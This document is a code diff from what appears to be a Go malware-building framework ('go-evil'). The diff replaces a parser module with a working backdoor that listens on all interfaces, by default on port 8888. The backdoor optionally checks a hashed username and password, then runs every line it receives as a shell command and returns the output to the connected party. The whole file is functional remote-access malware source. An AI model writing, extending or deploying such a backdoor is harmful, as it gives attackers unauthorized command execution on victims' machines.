+++ domains/backdoor/backdoor.go
@@ -1,87 +1,193 @@
 package backdoor
 
 import (
-	"regexp"
+	"net"
+	"strings"
 
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/domains/attack_vector"
+	"github.com/s9rA16Bf4/go-evil/utility/converter"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
-const (
-	EXTRACT_SUBDOMAIN      = "(backdoor)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                 // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(backdoor)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
-)
-
-func Parse(new_line string) {
-	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
-	result := regex.FindAllStringSubmatch(new_line, -1)
-	var value string
-	if len(result) > 0 {
-		value = result[0][1]
-	} else {
-		value = "NULL"
-	}
-	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
-	result = regex.FindAllStringSubmatch(new_line, -1)
-
-	if len(result) > 0 { // There is a subdomain to extract
-		subdomain := result[0][2]
-		function := result[0][3]
-
-		switch subdomain {
-		case "set":
-			switch function {
-			case "hash":
-				mal.AddContent("back.Set_hash(\"" + value + "\")")
-			case "user":
-				mal.AddContent("back.Set_username(\"" + value + "\")")
-			case "password":
-				mal.AddContent("back.Set_password(\"" + value + "\")")
-			case "port":
-				mal.AddContent("back.Set_port(\"" + value + "\")")
-			case "protocol":
-				mal.AddContent("back.Set_protocol(\"" + value + "\")")
-			case "welcome":
-				mal.AddContent("back.Set_welcome_msg(\"" + value + "\")")
-			case "read_size":
-				mal.AddContent("back.Set_read_size(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-		case "login":
-			switch function {
-			case "enable":
-				mal.AddContent("back.Enable_login()")
-			case "disable":
-				mal.AddContent("back.Disable_login()")
-			default:
-				function_error(function)
-			}
-		default:
-			subdomain_error(subdomain)
-		}
-	} else { // There might be a function which doesn't require a subdomain to work
-		regex = regexp.MustCompile(EXTRACT_FUNCTION)
-		result = regex.FindAllStringSubmatch(new_line, -1)
-		if len(result) > 0 {
-			function := result[0][2]
-			switch function {
-			case "start":
-				mal.AddContent("back.Start()")
-			case "serve":
-				mal.AddContent("back.Serve()")
-			case "stop":
-				mal.AddContent("back.Close()")
-			default:
-				function_error(function)
-			}
-		}
-	}
+type backdoor_t struct {
+	ip                string // This will be localhost
+	port              string
+	protocol          string       // TCP
+	conn              net.Listener // The active connection
+	read_size         int          // How many bits should be read
+	login             bool         // Is a login required to login, default is false
+	username          string       // Username to login
+	password          string       // Password to login
+	welcome_msg       string       // Message to print when you connect
+	hashing_algorithm string       // Which hashing algorithm to utilize
 }
-func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "backdoor.Parse()")
+
+var c_back backdoor_t
+
+func Set_port(new_port string) {
+	if converter.String_to_int(new_port, "backdoor.Set_port()") == -1 { // Will also check if the new port is an actual int
+		return
+	}
+	c_back.port = new_port
 }
-func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "backdoor.Parse()")
+
+func Enable_login() {
+	c_back.login = true
+}
+func Disable_login() {
+	c_back.login = false
+}
+
+func Set_username(username string) {
+	c_back.username = username
+}
+func Set_password(password string) {
+	c_back.password = password
+}
+
+func Set_protocol(new_proto string) {
+	if new_proto != "tcp" && new_proto != "udp" {
+		notify.Error("Unknown network protocol '"+new_proto+"'", "backdoor.Set_protocol")
+		return
+	}
+
+	c_back.protocol = new_proto
+}
+
+func Set_welcome_msg(new_msg string) {
+	c_back.welcome_msg = new_msg + "\n"
+}
+
+func Set_hash(new_hash string) {
+	c_back.hashing_algorithm = new_hash
+}
+
+func Set_read_size(new_size string) {
+	value := converter.String_to_int(new_size, "backdoor.Set_read_size()")
+	if value == -1 {
+		return
+	}
+	c_back.read_size = value
+}
+
+func Start() {
+	c_back.ip = "0.0.0.0"
+
+	if c_back.protocol == "" {
+		Set_protocol("tcp")
+	}
+	if c_back.port == "" { // The port was never specified
+		Set_port("8888")
+	}
+	if c_back.read_size == 0 {
+		Set_read_size("1024")
+	}
+	conn, err := net.Listen(c_back.protocol, c_back.ip+":"+c_back.port)
+	if err != nil {
+		notify.Error(err.Error(), "backdoor.Start()")
+		return
+	}
+	c_back.conn = conn
+}
+
+func Close() {
+	c_back.conn.Close()
+}
+
+func extract_login_credentials(in []byte) string {
+	var toReturn string
+	for _, c := range in {
+		if c == 0 || c == 10 {
+			break
+		} else {
+			toReturn += string(c)
+		}
+	}
+	return toReturn
+}
+
+func Serve() {
+	active_conn, err := c_back.conn.Accept() // accept any connection
+	if err != nil {
+		active_conn.Close() // Closes the connection
+		Close()
+		notify.Error(err.Error(), "backdoor.serve()")
+		return
+	}
+	if c_back.login { // We must authenticate the user
+		for { // We will exit ony once a login is correct
+			read := make([]byte, c_back.read_size)
+			var user, pass string
+
+			active_conn.Write([]byte("[1] Username: "))
+			active_conn.Read(read) // Read the username
+			if read[0] == 0 {
+				//Serve() // Reset the connection
+				return
+			}
+			user = extract_login_credentials(read)
+
+			active_conn.Write([]byte("[2] Password: "))
+			active_conn.Read(read) // Read the password
+			pass = extract_login_credentials(read)
+
+			// Hash the username and password
+			attack_vector.Set_hash(c_back.hashing_algorithm)
+			user = attack_vector.Hash(user)
+			pass = attack_vector.Hash(pass)
+
+			if user != c_back.username || pass != c_back.password {
+				active_conn.Write([]byte("[!] Invalid username and/or password\n"))
+			} else { // The provided info was correct
+				break
+			}
+		}
+	}
+
+	active_conn.Write([]byte(c_back.welcome_msg)) // Welcome the user
+	for {                                         // A user connected
+		active_conn.Write([]byte(">> "))
+		read_data := make([]byte, c_back.read_size)
+		active_conn.Read(read_data)
+		if read_data[0] == 0 { // The user disconnected so exit this function
+			return
+		}
+
+		var command string
+		var args string
+		var first_space bool // First space splits the command and the arguments
+		// This portion reads the read data and splits it up to what it belives is the command and the command args (if there is any)
+		for _, c := range read_data {
+			if c == 0 || c == 10 { // 0 = empty data, 10 = New line
+				break
+			}
+			if c == 32 && !first_space { // 32 = Space
+				first_space = true
+			} else {
+				if !first_space {
+					command += string(c)
+				} else {
+					args += string(c)
+				}
+			}
+		}
+		var toReturn []byte
+		if command == "" { // Nothing was most likely entered
+			toReturn = append(toReturn, []byte("No command was entered\n")...)
+		} else {
+			var resp subprocess.Response
+			if args != "" {
+				resp = subprocess.RunShell("", "", strings.Split(command+" "+args, " ")...)
+			} else {
+				resp = subprocess.RunShell("", "", command)
+			}
+			if resp.StdErr != "" {
+				toReturn = []byte(resp.StdErr)
+			} else {
+				toReturn = []byte(resp.StdOut)
+			}
+		}
+		active_conn.Write([]byte(toReturn)) // Send the output back to the user
+	}
 }
